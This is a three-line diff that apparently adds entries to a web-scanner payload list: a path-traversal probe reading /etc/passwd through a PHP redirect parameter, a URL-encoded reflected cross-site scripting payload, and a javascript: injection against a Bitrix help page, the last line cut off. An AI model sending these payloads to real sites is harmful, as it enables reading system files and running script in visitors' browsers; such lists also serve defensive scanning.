@@ -1,0 +1,3 @@
+/src/redirect.php?plugins[]=../../../../etc/passwd%00
+/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/bitrix/help/en/index.html?page=javascript:alert(
